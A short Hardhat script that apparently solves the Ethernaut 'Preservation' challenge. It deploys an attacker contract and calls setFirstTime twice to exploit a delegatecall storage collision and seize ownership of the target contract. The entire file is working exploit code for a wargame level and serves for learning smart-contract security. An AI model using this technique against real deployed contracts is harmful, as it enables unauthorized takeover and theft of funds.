import { ethers } from "hardhat";

const CONTRACT_NAME = "Preservation";
const ATTACKER_NAME = "LibraryContractAttacker";
const CONTRACT_ADDRESS = "0x600E96f772B4fF88d0aE24a2152e4423ef814351";

async function main() {
  const [attacker] = await ethers.getSigners()

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy();
  await attackerContract.deployed();

  let tx
  tx = await contract.setFirstTime(attackerContract.address)
  await tx.wait()

  tx = await contract.setFirstTime(attacker.address)
  await tx.wait()
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
